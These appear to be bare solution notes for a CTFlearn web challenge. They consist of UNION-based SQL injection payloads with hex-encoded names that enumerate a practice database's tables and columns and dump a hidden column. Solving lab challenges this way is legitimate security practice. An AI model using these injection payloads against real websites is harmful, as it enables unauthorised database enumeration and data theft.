https://web.ctflearn.com/web8/

0 union select 1, 0x616263, 3, 4

webeight
w0w_y0u_f0und_m3 = 7730775f7930755f6630756e645f6d33
f0und_m3

0 union select 1, (select group_concat(table_name) from information_schema.tables where table_schema = 0x7765626569676874), 3, 4

0 union select 1, (select group_concat(column_name) from information_schema.columns where table_schema = 0x7765626569676874 and table_name = 0x7730775f7930755f6630756e645f6d33), 3, 4

0 union select 1, (select group_concat(f0und_m3) from w0w_y0u_f0und_m3), 3, 4
